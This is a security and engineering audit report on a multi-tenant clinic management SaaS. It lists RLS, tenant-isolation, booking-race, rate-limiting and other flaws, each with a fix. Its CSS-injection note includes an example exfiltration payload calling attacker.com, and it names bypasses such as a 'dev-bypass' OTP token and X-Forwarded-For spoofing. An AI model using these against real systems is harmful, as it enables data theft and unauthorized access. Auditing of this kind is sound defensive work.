# Webs-Alots — Full Production Audit Report

**Audit Date:** March 23, 2026  
**Repository:** https://github.com/groupsmix/webs-alots  
**Stack:** Next.js 16.2.0 · React 19 · TypeScript 5 · Supabase (PostgreSQL + Auth) · Cloudflare Workers · Tailwind CSS 4 · shadcn/ui  
**Deployment:** Cloudflare Workers (main → production, staging → staging)

---

## 1. High-Level Architecture Overview

### System Design

The platform is a **multi-tenant SaaS clinic management system** targeting Morocco's healthcare market. Each clinic gets a subdomain (e.g., `demo.yourdomain.com`) and the system supports 36+ clinic types (doctor, dentist, pharmacy, lab, diagnostic, equipment, para-medical, etc.).

**Runtime Architecture:**

```
Browser → Cloudflare CDN → Cloudflare Worker (Next.js SSR)
                                    ↓
                              Supabase (PostgreSQL + Auth)
                              Cloudflare R2 (file storage)
                              WhatsApp API / Twilio (messaging)
                              Stripe / CMI (payments)
```

**Key Architectural Decisions:**

| Decision | Implementation | Assessment |
|----------|---------------|------------|
| Multi-tenancy model | Hybrid: subdomain headers (dynamic) + static `clinicConfig` (hardcoded per build) + user profile `clinic_id` | **Problematic** — three independent clinic_id sources that can diverge |
| Auth | Supabase Phone OTP + cookie-based sessions | Good for target market (Morocco — phone-first) |
| Authorization | 5-role RBAC (super_admin, clinic_admin, receptionist, doctor, patient) | Solid role hierarchy |
| Data isolation | PostgreSQL RLS + application-level `clinic_id` filtering | Defense in depth — good |
| File storage | Cloudflare R2 (S3-compatible) | Good choice for Cloudflare deployment |
| Payments | Stripe (international) + CMI (Morocco-specific) | Appropriate dual-gateway approach |
| Edge runtime | Cloudflare Workers | Constrains library choices but good for latency |

### Request Flow

1. **Middleware** (`src/middleware.ts:154-412`): Body size check → CSP nonce → subdomain extraction → CSRF validation → rate limiting → Supabase auth → clinic resolution → role-based routing
2. **API routes**: `withAuth()` wrapper (`src/lib/with-auth.ts`) or direct Supabase client creation
3. **Data layer**: `src/lib/data/server.ts` (authenticated) and `src/lib/data/public.ts` (public-facing, uses static `clinicConfig.clinicId`)
4. **Database**: Supabase PostgreSQL with RLS policies as the final security layer

### Tenant Resolution — The Core Tension

**This is the single most important architectural concern in the entire codebase.**

Three independent mechanisms determine clinic context:

| Mechanism | Source | Used By |
|-----------|--------|---------|
| **Subdomain headers** | Middleware resolves subdomain → DB lookup → sets `x-tenant-*` headers | `getTenant()` in `src/lib/tenant.ts` |
| **Static config** | `clinicConfig.clinicId` hardcoded in `src/config/clinic.config.ts` | `src/lib/data/public.ts` — ALL public data fetching |
| **User profile** | `users.clinic_id` column in database | RLS policies, `withAuth()` profile lookup |

**In the current single-tenant-per-build deployment model**, all three return the same clinic_id, so this works. But this architecture **fundamentally prevents true multi-tenancy** (one build serving all clinics) without a significant refactor. See Section 4 for details.

---

## 2. Critical Issues (MUST FIX NOW)

### CRITICAL-01: `users_insert_auth_trigger` RLS Policy Was Overly Permissive (FIXED in 00028)

**Status:** Fixed in migration `00028_security_hardening.sql`

**Original vulnerability** (`00002_auth_rls_roles.sql:199-200`):
```sql
CREATE POLICY "users_insert_auth_trigger" ON users
  FOR INSERT WITH CHECK (TRUE);
```

This allowed **any authenticated user** to insert arbitrary rows into the `users` table with any role (including `super_admin`) and any `clinic_id`. Combined with the auth trigger reading role from `raw_user_meta_data` (attacker-controlled), this was a **privilege escalation vulnerability**.

**Fix** (`00028_security_hardening.sql:74-81`):
```sql
CREATE POLICY "users_insert_self_only" ON users
  FOR INSERT WITH CHECK (
    auth.uid() IS NULL  -- auth trigger (service role)
    OR (auth_id = auth.uid() AND role = 'patient')  -- self-insert as patient only
  );
```

**Assessment:** Fix is correct. The auth trigger now defaults to `'patient'` role and only reads role/clinic from `raw_app_meta_data` (server-controlled). However, **verify that migration 00028 has been applied in production**. If not, this is still exploitable.

### CRITICAL-02: `clinics_select_active_public` Leaked All Clinics (FIXED in 00028)

**Status:** Fixed in migration `00028_security_hardening.sql`

**Original** (`00002_auth_rls_roles.sql:139-140`):
```sql
CREATE POLICY "clinics_select_active_public" ON clinics
  FOR SELECT USING (status = 'active');
```

Any authenticated user could read **all active clinics** — names, configs, tiers, etc. This is a multi-tenant data leak.

**Fix** (`00028_security_hardening.sql:95-103`): Now restricted to own clinic, unauthenticated access (public directory), or super admin.

### CRITICAL-03: Public Data Layer Uses Hardcoded `clinicConfig.clinicId` Instead of Tenant Headers

**File:** `src/lib/data/public.ts:83-85`
```typescript
function getClinicId(): string {
  return clinicConfig.clinicId;
}
```

**Every public data function** (branding, reviews, doctors, services, slots, pharmacy products, blog posts — 20+ functions across 700 lines) uses this hardcoded value. This means:

1. **If someone deploys a single build serving multiple subdomains**, all subdomains would show data from the **same** clinic configured in `clinic.config.ts`
2. The subdomain-resolved tenant headers from middleware are **completely ignored** by the public data layer
3. This creates an inconsistency: the middleware correctly resolves clinic X from the subdomain, but public pages show data from clinic Y (the hardcoded one)

**Severity:** CRITICAL for multi-tenant scalability. Currently masked because each clinic gets its own build.

**Fix:** Replace `clinicConfig.clinicId` with `getTenant()?.clinicId` or accept the request context:
```typescript
async function getClinicId(): Promise<string> {
  const tenant = await getTenant();
  return tenant?.clinicId ?? clinicConfig.clinicId; // fallback
}
```

### CRITICAL-04: No `clinic_id` Enforcement on Server-Side Mutations

**File:** `src/lib/data/server.ts`

Several mutation functions accept a `clinic_id` parameter from the caller without verification:

- `createAppointment()` (line 970) — accepts arbitrary `clinic_id`
- `createReview()` (line 1004) — accepts arbitrary `clinic_id`
- `addToWaitingList()` (line 1029) — accepts arbitrary `clinic_id`
- `createRadiologyOrder()` (line 1059) — accepts arbitrary `clinic_id`

These rely **entirely** on RLS policies to prevent cross-tenant writes. If any code path passes the wrong `clinic_id`, or if the Supabase client has elevated permissions, data could be written to the wrong tenant.

**Severity:** HIGH — defense in depth requires application-level validation too, not just RLS.

**Fix:** Validate `clinic_id` matches the authenticated user's `clinic_id` before any insert:
```typescript
if (data.clinic_id !== profile.clinic_id) {
  throw new Error("clinic_id mismatch");
}
```

### CRITICAL-05: `updateAppointmentStatus` Has No Clinic Scoping

**File:** `src/lib/data/server.ts:949-968`
```typescript
export async function updateAppointmentStatus(
  appointmentId: string,
  status: string,
  extra?: { cancellation_reason?: string },
): Promise<boolean> {
  const supabase = await createClient();
  const updateData: Record<string, unknown> = { status };
  // ...
  const { error } = await supabase
    .from("appointments")
    .update(updateData)
    .eq("id", appointmentId);  // ← No clinic_id filter!
```

This updates by `id` only, with no `clinic_id` scope. If RLS is misconfigured or bypassed, any user could update any appointment across tenants by guessing UUIDs.

**Same pattern in:**
- `markNotificationRead()` (line 1045) — updates by `id` only
- `updateReviewResponse()` (line 1019) — updates by `id` only
- `updateRadiologyOrderStatus()` (line 1087) — updates by `id` only

---

## 3. Security Vulnerabilities

### SEV-1 (Critical)

#### S1: Race Condition in Booking Slot Enforcement

**File:** `src/app/api/booking/route.ts:309-335`

The post-insert maxPerSlot check has a TOCTOU race:

```typescript
// Step 1: Insert appointment (line ~290)
// Step 2: Count active bookings for this slot (line 316-326)
// Step 3: If count > maxPerSlot, delete the just-inserted row (line 328-331)
```

**Problem:** Between steps 1 and 2, another concurrent request could also insert and also count ≤ maxPerSlot, leaving **both** insertions in place — exceeding the cap.

The code acknowledges this (comment `DI-HIGH-02`) but the fix is incomplete. The `count > maxPerSlot` check on line 327 should be `count > maxPerSlot` but **both** concurrent requests see `count == maxPerSlot` (not `>`) because each sees its own row plus the other's.

**Real fix:** Use PostgreSQL advisory locks or a unique partial index:
```sql
-- Enforce at DB level with a partial index + check constraint
-- Or use SELECT ... FOR UPDATE SKIP LOCKED in a transaction
```

#### S2: Booking API Dev Bypass Token

**File:** `src/app/api/booking/route.ts:49`
```typescript
if (process.env.NODE_ENV === "development") return token === "dev-bypass";
```

If `NODE_ENV` is accidentally set to `"development"` in production (misconfigured env), anyone can bypass OTP verification with `token=dev-bypass`. This is a common deployment mistake.

**Fix:** Use a more restrictive check:
```typescript
if (process.env.NODE_ENV === "development" && process.env.ALLOW_DEV_BYPASS === "true") {
  return token === "dev-bypass";
}
```

### SEV-2 (High)

#### S3: Rate Limiter Fails Open on Network Errors

**File:** `src/lib/rate-limit.ts:180-184`
```typescript
} catch (err) {
  // Network/transient failure — fail open to avoid blocking
  // legitimate traffic.
  logger.error("Rate limiter network failure — failing open", ...);
  return true;  // ← ALLOWS the request
}
```

If the Supabase backend for rate limiting is down, **all rate limits are disabled**. An attacker who can cause Supabase connectivity issues (e.g., connection exhaustion) gets unlimited access.

**Assessment:** This is a documented trade-off (availability over security), but it should be configurable. For healthcare, failing closed may be more appropriate.

#### S4: Rate Limiter Supabase Fallback Has Race Condition

**File:** `src/lib/rate-limit.ts:125-177`

When the `rate_limit_increment` RPC doesn't exist, the fallback uses SELECT → UPDATE with optimistic locking. The re-read on line 171-176 can still return a stale count if multiple concurrent requests all increment simultaneously.

**Impact:** Rate limits can be exceeded by ~2-3x under high concurrency.

#### S5: WhatsApp Webhook Processes Messages Without Patient-Level Auth

**File:** `src/app/api/webhooks/route.ts:143-153`

When a patient sends "CONFIRM" or "CANCEL" via WhatsApp, the system updates the appointment status **without any additional verification** beyond matching the phone number:

```typescript
if (upperText === "CONFIRM" && appt) {
  await supabase
    .from("appointments")
    .update({ status: "confirmed" })
    .eq("id", appt.id);
}
```

**Risk:** Phone number spoofing in WhatsApp Business API is unlikely but not impossible. More critically, if a patient has **multiple upcoming appointments**, this blindly confirms/cancels the **first one** (sorted by date ascending) — which may not be the one the patient intended.

#### S6: CMI Callback Has No IP Allowlisting

**File:** `src/app/api/payments/cmi/callback/route.ts:15-81`

The CMI callback verifies the HMAC hash but doesn't check the source IP. CMI provides a list of callback IPs — these should be allowlisted to prevent replay attacks with a captured valid hash.

#### S7: No Audit Trail for Critical Financial Operations

**File:** `src/app/api/payments/cmi/callback/route.ts`

Payment status updates (lines 43-49, 64-67) have no audit logging. The `logAuditEvent()` utility exists (`src/lib/audit-log.ts`) but is not used in payment flows. For healthcare billing compliance, every payment state change should be logged.

#### S8: Impersonation Cookie Not Scoped Correctly

**File:** `src/app/api/impersonate/route.ts`

The impersonation feature (super admin views clinic as clinic_admin) uses a cookie with a 4-hour expiry. However, I couldn't verify if the cookie has `SameSite=Strict` and `Secure` flags set, which would prevent CSRF-based impersonation abuse.

### SEV-3 (Medium)

#### S9: CSP `style-src 'unsafe-inline'` Weakens XSS Protection

**File:** `src/middleware.ts:136`
```typescript
"style-src 'self' 'unsafe-inline'",
```

Acknowledged as an accepted risk for Tailwind/shadcn. However, this means any XSS vector that can inject a `<style>` tag can exfiltrate data via CSS injection (e.g., `input[value^="a"] { background: url(attacker.com/a) }`).

#### S10: `X-Forwarded-For` Header Spoofing for Rate Limiting

**File:** `src/lib/rate-limit.ts:34-41`
```typescript
export function extractClientIp(request: NextRequest): string {
  return (
    request.headers.get("cf-connecting-ip") ??
    request.headers.get("x-real-ip") ??
    request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ??
    "unknown"
  );
}
```

Behind Cloudflare, `cf-connecting-ip` is reliable. But if a non-Cloudflare proxy sits in front (dev, staging, or a misconfigured setup), `x-forwarded-for` is attacker-controlled and can bypass rate limiting.

#### S11: Onboarding Orphaned Clinic Detection is Name-Based

**File:** `src/app/api/onboarding/route.ts:81-87`
```typescript
const { data: orphanedClinic } = await supabase
  .from("clinics")
  .select("id")
  .eq("name", body.clinic_name)
  .eq("clinic_type_key", body.clinic_type_key)
  .limit(1)
  .maybeSingle();
```

If two users simultaneously create clinics with the same name and type, one could "adopt" the other's orphaned clinic, gaining admin access to it.

#### S12: No Input Length Limit on Chat Messages

**File:** `src/lib/validations.ts:307-317`
```typescript
export const chatRequestSchema = z.object({
  clinicId: z.string().optional(),
  messages: z.array(
    z.object({
      role: z.enum(["user", "assistant"]),
      content: z.string(),  // ← No .max() limit
    }),
  ).min(1),
});
```

A user could send megabytes of text in chat messages, exhausting AI API quotas and potentially causing OOM.

---

## 4. Scalability Problems

### SCALE-01: Static `clinicConfig` Architecture Blocks True Multi-Tenancy

**Files:** `src/config/clinic.config.ts`, `src/lib/data/public.ts`

The current architecture requires **one Cloudflare Worker deployment per clinic**. At scale:

| Clinics | Deployments | Monthly Cloudflare Cost (est.) |
|---------|-------------|-------------------------------|
| 100 | 100 Workers | ~$500/mo |
| 1,000 | 1,000 Workers | ~$5,000/mo |
| 10,000 | 10,000 Workers | Infeasible |

**To scale beyond ~100 clinics**, you MUST refactor `public.ts` to read clinic context from the request (middleware headers) instead of `clinicConfig`.

### SCALE-02: Dashboard Stats Executes 8 Parallel Queries

**File:** `src/lib/data/server.ts:863-904`

`getClinicDashboardStats()` runs 8 parallel queries to compute dashboard stats:

```typescript
const [
  patientCountRes,      // SELECT count(*) FROM users
  appointmentCountRes,  // SELECT count(*) FROM appointments
  completedCountRes,    // SELECT count(*) FROM appointments WHERE status='completed'
  noShowCountRes,       // SELECT count(*) FROM appointments WHERE status='no_show'
  paymentsRes,          // SELECT amount FROM payments (ALL rows!)
  reviewsRes,           // SELECT stars FROM reviews (ALL rows!)
  doctorCountRes,       // SELECT count(*) FROM users WHERE role='doctor'
  serviceCountRes,      // SELECT count(*) FROM services
] = await Promise.all([...]);
```

**Problems:**
1. `paymentsRes` fetches **all payment rows** to sum amounts client-side (line 888). For a clinic with 10,000+ payments, this transfers megabytes of data. Should use `SUM()` via a database function or RPC.
2. `reviewsRes` fetches **all review rows** to compute average. Same problem.
3. 8 queries per dashboard load creates significant connection pool pressure at scale.

**Fix:** Create a single PostgreSQL function:
```sql
CREATE FUNCTION get_clinic_dashboard_stats(p_clinic_id UUID)
RETURNS TABLE(total_patients INT, total_revenue DECIMAL, ...) AS $$
  -- Single query with subqueries
$$;
```

### SCALE-03: Super Admin Stats Queries ALL Data Without Pagination

**File:** `src/lib/data/server.ts:919-943`

```typescript
export async function getSuperAdminStats(): Promise<SuperAdminStats> {
  const [clinicsRes, patientCountRes, appointmentCountRes, revenueRes] = await Promise.all([
    supabase.from("clinics").select("*"),  // ALL clinics
    supabase.from("users").select("id", { count: "exact", head: true }).eq("role", "patient"),  // Count ALL patients
    supabase.from("appointments").select("id", { count: "exact", head: true }),  // Count ALL appointments
    supabase.from("payments").select("amount").eq("status", "completed"),  // ALL completed payments
  ]);
```

At 10,000 clinics × 100 patients each = 1M patient rows counted. The `revenueRes` query fetches **every completed payment row** across all tenants to sum client-side.

### SCALE-04: Reminder Cron Job Limited to 500 Appointments

**File:** `src/app/api/cron/reminders/route.ts:66`
```typescript
.limit(500);
```

If more than 500 appointments need reminders in a 30-minute window (realistic for a platform with 1000+ clinics), some patients won't receive their reminders. This needs cursor-based pagination.

### SCALE-05: No Connection Pooling Strategy

Every `await createClient()` call creates a new Supabase client. In Cloudflare Workers, each isolate gets a cold start, and there's no persistent connection pool. With the Supabase JS client using REST (not pgbouncer), this is less of an issue, but at scale:

- Each Worker isolate making 8+ parallel queries per request can exhaust Supabase's connection limits
- The Supabase free tier allows only 60 direct connections

**Recommendation:** Use Supabase connection pooling via pgBouncer (connection string with port 6543) and consider implementing request-level client caching.

---

## 5. Database & Supabase Issues

### DB-01: Schema Has 60+ Tables But No Database Views

**Files:** `supabase/migrations/00001_initial_schema.sql` through `00027`

The schema defines 60+ tables across 28 migrations with no views or materialized views. Common query patterns (e.g., "appointment with patient name, doctor name, service name, clinic name") require multi-table JOINs that are repeated in application code.

**Recommendation:** Create views for common joins:
```sql
CREATE VIEW v_appointment_details AS
SELECT a.*, p.name AS patient_name, d.name AS doctor_name,
       s.name AS service_name, c.name AS clinic_name
FROM appointments a
JOIN users p ON p.id = a.patient_id
JOIN users d ON d.id = a.doctor_id
LEFT JOIN services s ON s.id = a.service_id
JOIN clinics c ON c.id = a.clinic_id;
```

### DB-02: Missing Composite Indexes for Common Query Patterns

While migration `00024_missing_fk_indexes.sql` adds many individual FK indexes, several common query patterns lack composite indexes:

1. **Appointments by clinic + date + status** (used in dashboard, slot availability):
```sql
CREATE INDEX idx_appointments_clinic_date_status
ON appointments(clinic_id, appointment_date, status);
```

2. **Users by clinic + role** (used in `getClinicUsers`, `getDoctors`, `getPatients`):
```sql
CREATE INDEX idx_users_clinic_role ON users(clinic_id, role);
```

3. **Payments by clinic + status** (used in revenue calculations):
```sql
CREATE INDEX idx_payments_clinic_status ON payments(clinic_id, status);
```

### DB-03: `users` Table Serves All Roles — No Patient-Specific Columns

**File:** `supabase/migrations/00001_initial_schema.sql:25-34`

The `users` table stores super_admins, clinic_admins, receptionists, doctors, and patients in the same table. This means:

- Every query for patients scans ALL user rows (filtered by `role = 'patient'`)
- Patient-specific data (date_of_birth, insurance_type, blood_type) must be stored in `config` JSONB or separate tables
- Doctor-specific data (specialty, consultation_fee, languages) is similarly unstructured

**Assessment:** Single table inheritance is acceptable at small scale, but at 100k+ users, consider partitioning by role or creating separate `patients` and `staff` tables.

### DB-04: `appointments` Has Redundant Time Columns

**File:** `supabase/migrations/00001_initial_schema.sql:37-52` and later migrations

Appointments have THREE time representations:
- `slot_start` / `slot_end` (TIMESTAMPTZ, original columns)
- `appointment_date` / `start_time` / `end_time` (added later)

Both sets are populated (see `src/lib/data/server.ts:986-991`). This creates:
1. Storage overhead (6 columns for what should be 2)
2. Risk of inconsistency if one is updated without the other
3. Query confusion — code checks `appointment_date` in some places, `slot_start` in others

The cron reminder handler (`src/app/api/cron/reminders/route.ts:117-134`) has complex fallback logic to handle both formats.

### DB-05: RLS Policy `reviews_select_clinic` Leaks Reviews Across Tenants

**File:** `supabase/migrations/00002_auth_rls_roles.sql:385-386`
```sql
CREATE POLICY "reviews_select_clinic" ON reviews
  FOR SELECT USING (clinic_id = get_user_clinic_id());
```

This allows any authenticated user in clinic A to see **all** reviews for clinic A, including other patients' reviews. While reviews are generally public, in a healthcare context, the **patient name** in a review could be considered PHI (Protected Health Information).

### DB-06: No Row-Level Security on `activity_logs`

**File:** `src/lib/audit-log.ts:34`

The `activity_logs` table (used for audit logging) doesn't appear to have RLS policies defined in any migration. If RLS is enabled on this table, audit log writes from non-admin users will silently fail. If RLS is not enabled, any authenticated user can read all audit logs.

### DB-07: `notification_log` Uses Text Columns for Status

**File:** `supabase/migrations/00020_notification_log.sql`

The `notification_log` table uses text columns for `status` and `channel` without CHECK constraints (unlike other tables). This allows arbitrary values that don't match the TypeScript enum types.

### DB-08: No Soft Delete Pattern

All tables use hard deletes (`ON DELETE CASCADE`). For a healthcare SaaS:
- Deleted patient records are unrecoverable
- Audit trails are broken when referenced records are cascade-deleted
- Regulatory compliance (HIPAA equivalent in Morocco) may require data retention

**Recommendation:** Add `deleted_at TIMESTAMPTZ` columns and filter with `WHERE deleted_at IS NULL`.

---

## 6. Code Quality Problems

### CQ-01: `src/lib/data/server.ts` is a 1,204-Line Monolith

This single file contains ALL server-side data operations: auth, clinics, users, services, appointments, payments, reviews, notifications, documents, prescriptions, consultation notes, waiting list, family members, odontogram, treatment plans, lab orders, installments, sterilization log, products, stock, suppliers, prescription requests, loyalty points, dashboard stats, super admin stats, and all mutations.

**Problems:**
- Difficult to find related functionality
- No separation of read vs. write operations
- No domain-specific error handling
- Import of this file pulls in ALL type definitions

**Recommendation:** Split into domain modules:
```
src/lib/data/
  appointments.ts
  patients.ts
  payments.ts
  pharmacy.ts
  dental.ts
  radiology.ts
  admin.ts
```

### CQ-02: `src/lib/data/public.ts` Uses Unsafe Type Assertions

**File:** `src/lib/data/public.ts` — throughout

Almost every function uses `Record<string, unknown>` and manual property casting:

```typescript
return data.map((s: Record<string, unknown>) => ({
  id: s.id as string,
  name: s.name as string,
  description: (s.description as string) ?? "",
  price: (s.price as number) ?? 0,
  // ...
}));
```

This bypasses TypeScript's type safety entirely. If a database column is renamed or removed, there's no compile-time error — just a runtime `undefined`.

**Fix:** Use Supabase's generated types:
```typescript
import type { Database } from "@/lib/types/database";
type ServiceRow = Database["public"]["Tables"]["services"]["Row"];
```

### CQ-03: Duplicated Supabase Client Creation

The pattern `const supabase = await createClient()` appears in almost every function. In `server.ts`, it's called once per function call, meaning a single page rendering 5 server components creates 5+ Supabase clients.

**Recommendation:** Use a request-scoped singleton (React cache or Next.js `headers()` memoization).

### CQ-04: Inconsistent Error Handling

**Across API routes:**
- Some routes return `{ error: "message" }` with status codes
- Some routes catch errors and return generic 500s
- Some routes log errors, some don't
- The `logger.warn()` is used for errors that should be `logger.error()` (e.g., payment failures)

**Example inconsistency:**
- `booking/route.ts` — detailed error messages with specific codes
- `cmi/callback/route.ts:78` — generic "Failed to process payment callback" hiding the actual error

### CQ-05: Magic Strings Throughout the Codebase

**Examples:**
- `"confirmed"`, `"pending"`, `"cancelled"` used as raw strings in webhook handler (`src/app/api/webhooks/route.ts:138, 144, 151`) instead of the `APPOINTMENT_STATUS` enum used elsewhere
- Role strings `'patient'`, `'doctor'` hardcoded in multiple places
- Status strings inconsistent between SQL CHECK constraints and TypeScript types

### CQ-06: `void clinicError` Anti-Pattern

**File:** `src/app/api/onboarding/route.ts:130, 150, 169`
```typescript
if (clinicError || !clinic) {
  void clinicError;  // ← What is this?
  return NextResponse.json(
    { error: "Failed to create clinic" },
    { status: 500 },
  );
}
```

The `void clinicError` is presumably to suppress unused-variable warnings, but it hides the actual error from logs. The error should be logged.

### CQ-07: No Request Validation on Several API Routes

While the codebase has comprehensive Zod schemas (`src/lib/validations.ts` — 353 lines), I couldn't verify that all API routes use them. The validation coverage is good for the routes I examined, but the v1 API appointment creation schema (`v1AppointmentCreateSchema`) uses `.max(10)` for date and `.max(8)` for time instead of proper regex validation:

```typescript
appointment_date: z.string().min(1).max(10),  // Accepts "aaaaaaaaaa"
start_time: z.string().min(1).max(8),          // Accepts "aaaaaaaa"
```

Compare with the internal schemas that use proper regex:
```typescript
const isoDate = z.string().regex(/^\d{4}-\d{2}-\d{2}$/, "Expected YYYY-MM-DD");
const timeHHMM = z.string().regex(/^\d{2}:\d{2}$/, "Expected HH:MM");
```

---

## 7. Performance Issues

### PERF-01: Revenue Calculation Fetches All Payment Rows

**File:** `src/lib/data/server.ts:880, 888`
```typescript
supabase.from("payments").select("amount").eq("clinic_id", clinicId).eq("status", "completed"),
// ...
const totalRevenue = payments.reduce((sum, p) => sum + (p.amount ?? 0), 0);
```

This fetches every completed payment for the clinic and sums client-side. For a clinic with 50,000 payments, this transfers ~1MB+ of data per dashboard load.

**Fix:** Use a Supabase RPC:
```sql
CREATE FUNCTION get_clinic_revenue(p_clinic_id UUID) RETURNS DECIMAL AS $$
  SELECT COALESCE(SUM(amount), 0) FROM payments
  WHERE clinic_id = p_clinic_id AND status = 'completed';
$$ LANGUAGE sql STABLE;
```

### PERF-02: `getPublicPharmacyPrescriptions` Does N+1 Patient Lookup

**File:** `src/lib/data/public.ts:626-674`

The function fetches all prescription requests, extracts unique patient IDs, then does a second query for patient details. This is technically a batch (not N+1), but the patient `SELECT ... IN (...)` with many IDs can be slow.

More importantly, it fetches **all** prescription requests for the clinic with no pagination:
```typescript
.order("created_at", { ascending: false });
// No .limit()!
```

### PERF-03: `getPublicAvailableSlots` Makes 3 Sequential Async Calls

**File:** `src/lib/data/public.ts:408-419`
```typescript
export async function getPublicAvailableSlots(...) {
  const [allSlots, bookingCounts] = await Promise.all([
    getPublicGeneratedSlots(doctorId, date),
    getPublicSlotBookingCounts(doctorId, date),
  ]);
  // ...
}
```

While these two are parallelized, `getPublicGeneratedSlots` itself calls `getPublicTimeSlots` which makes its own DB query. The entire slot availability check requires 3 DB round-trips minimum.

### PERF-04: Reminder Cron Processes Sequentially in Batches of 10

**File:** `src/app/api/cron/reminders/route.ts:204-229`

The dispatch queue processes in batches of 10 with `Promise.allSettled`. For 500 appointments, that's 50 sequential batches, each waiting for all 10 dispatches (WhatsApp API calls + DB inserts). This could take minutes.

**Recommendation:** Increase batch size or use a proper queue (Cloudflare Queues, Supabase Edge Functions with pg_net).

### PERF-05: No Caching Layer

There are no caching mechanisms anywhere in the codebase:
- No `Cache-Control` headers on API responses
- No Redis/KV caching for frequently-accessed data (clinic branding, services list)
- No React `cache()` wrapper for server component data fetching
- No `unstable_cache` / `revalidate` for Next.js data caching

For data that changes infrequently (clinic branding, service list, doctor profiles), caching would dramatically reduce Supabase load.

**Recommendation:** Use Cloudflare KV or Workers Cache API:
```typescript
const cached = await caches.default.match(cacheKey);
if (cached) return cached;
// ... fetch from Supabase
```

### PERF-06: Middleware Makes 2-3 DB Queries Per Request

**File:** `src/middleware.ts:301-372`

Every request to a subdomain triggers:
1. Rate limiter query (Supabase backend) — line 259
2. Clinic resolution by subdomain — line 329-333
3. `getUser()` auth verification — line 355-357
4. Profile query (for protected routes) — line 367-371

That's up to **4 Supabase round-trips** in the middleware alone, before any route handler executes. For Cloudflare Workers (globally distributed), each round-trip to Supabase (single region) adds 50-200ms latency.

**Fix:** Cache clinic lookups by subdomain in Cloudflare KV with a short TTL (60s). Consider Supabase auth token verification without a network call (JWT verification locally).

---

## 8. Edge Cases & Hidden Bugs

### BUG-01: Time Zone Blindness in Appointment Handling

The entire codebase treats dates and times as strings without timezone awareness:

**`src/app/api/booking/route.ts`:** Uses `body.date` and `body.time` as raw strings.

**`src/app/api/cron/reminders/route.ts:128`:**
```typescript
apptDatetime = new Date(`${appt.appointment_date}T${normalizedTime}`);
```

This creates a Date in the **server's timezone** (UTC for Cloudflare Workers), not the clinic's local timezone (Morocco is UTC+1 / UTC+0 depending on DST). A patient booking at "14:00" in Casablanca gets a reminder calculated at 14:00 UTC — which is 15:00 local time.

**Impact:** Reminders sent at the wrong time. The code partially acknowledges this (comment `MED-05` on line 34) but the fix only addresses date filtering, not the time calculation.

### BUG-02: Reminder Window Overlap Causes Duplicate Sends

**File:** `src/app/api/cron/reminders/route.ts:143-147`
```typescript
if (hoursUntil > 1.5 && hoursUntil <= 2.5) {
  trigger = "reminder_2h";
} else if (hoursUntil > 22 && hoursUntil <= 25) {
  trigger = "reminder_24h";
}
```

The cron runs every 30 minutes. If an appointment is exactly 2h away at minute 0, `hoursUntil = 2.0` → sends reminder. 30 minutes later, `hoursUntil = 1.5` → still matches `> 1.5` → would send again, but caught by the idempotency check (`alreadySent` Set). Good — the idempotency guard works correctly here.

However, the idempotency check uses `channel: "reminder"` (line 85) but dispatches use channels `["whatsapp", "sms", "in_app"]` (line 196). The notification_log entries are likely stored with the actual channel, not `"reminder"`, so the idempotency lookup may **not find** previous sends.

### BUG-03: `find-or-create-patient` Name Collision Risk

**File:** `src/lib/find-or-create-patient.ts`

When phone-based lookup fails, the function falls back to name-based lookup:
```typescript
// Falls back to name-based lookup only when exactly one match exists
```

But in a clinic with common names (e.g., "Mohammed" in Morocco), even a single match could be the wrong person. The function should require phone matching as a strict requirement, with name-only as a very last resort with staff confirmation.

### BUG-04: Billing Cron Uses Date String Comparison

**File:** `src/app/api/cron/billing/route.ts:23-28`
```typescript
const today = new Date().toISOString().split("T")[0];
const { data: subscriptions } = await supabase
  .from("clinic_subscriptions")
  .select("clinic_id, current_period_end, status")
  .in("status", ["active", "past_due"])
  .lte("current_period_end", today);
```

`today` is in UTC. If the cron runs at 2am UTC (as documented), `today = "2026-03-23"`. But a subscription ending at "2026-03-23" midnight in Morocco time (UTC+1) would be treated as expired a day early (since UTC midnight is 11pm Morocco time the day before).

### BUG-05: V1 API `POST /appointments` Doesn't Validate Doctor Belongs to Clinic

**File:** `src/app/api/v1/appointments/route.ts:96-111`

The API authenticates via API key (which provides `clinicId`), and sets `clinic_id: auth.clinicId` on the insert. But it doesn't verify that `body.doctor_id` or `body.patient_id` actually belong to that clinic. A valid API key holder could associate any doctor_id/patient_id from another clinic.

RLS would catch this **only if** the appointments table has RLS policies that check doctor/patient belong to the same clinic — but the current policies only check `clinic_id` matches the user's clinic, and the API key auth doesn't set a user context for RLS.

### BUG-06: `getPublicSlotBookingCounts` Uses `clinicConfig` for Public Slot Queries

**File:** `src/lib/data/public.ts:371-403`

The slot booking count query uses `clinicConfig.clinicId`:
```typescript
export async function getPublicSlotBookingCounts(doctorId: string, date: string) {
  const clinicId = getClinicId();  // ← clinicConfig.clinicId
```

If `clinicConfig.clinicId` doesn't match the actual tenant (subdomain), patients see wrong availability. Combined with CRITICAL-03, this means the booking availability check could show slots as available when they're actually full (for the real clinic), or vice versa.

### BUG-07: `searchPublicProducts` Has No SQL Injection Protection for Search Term

**File:** `src/lib/data/public.ts:493-507`

The Supabase `.ilike()` filter is used with user input:
```typescript
export async function searchPublicProducts(query: string) {
  // ...
  .ilike("name", `%${query}%`)
```

While Supabase's JS client parameterizes queries (preventing SQL injection), the `%` and `_` wildcards in the search term are not escaped. A search for `%` returns all products. A search for `_` matches any single character. This is a minor but real issue for search relevance.

### BUG-08: Concurrent Onboarding Creates Duplicate Clinics

**File:** `src/app/api/onboarding/route.ts:76-137`

The orphaned clinic detection on lines 81-87 uses `name + clinic_type_key` matching. But between the check and the insert on line 113, another request could create a clinic with the same name. The unique constraint violation on `auth_id` (line 154) catches **user** duplicates but not clinic duplicates.

---

## 9. Recommendations (Clear, Actionable)

### Priority 1: Must Fix Before More Clinics Onboard

| # | Recommendation | Effort | Files Affected |
|---|---------------|--------|----------------|
| R1 | **Verify migration 00028 is applied in production.** If not, the privilege escalation vuln is live. | 5 min | Run `SELECT * FROM pg_policies WHERE tablename = 'users' AND policyname = 'users_insert_self_only'` | 
| R2 | **Refactor `public.ts` to use tenant headers instead of `clinicConfig`** — this blocks true multi-tenancy | 2-3 days | `src/lib/data/public.ts`, `src/config/clinic.config.ts` |
| R3 | **Add `clinic_id` validation in server-side mutations** — don't rely solely on RLS | 1 day | `src/lib/data/server.ts` (all mutation functions) |
| R4 | **Create DB functions for aggregations** — stop fetching all rows to sum client-side | 1 day | New migration + `src/lib/data/server.ts:863-943` |
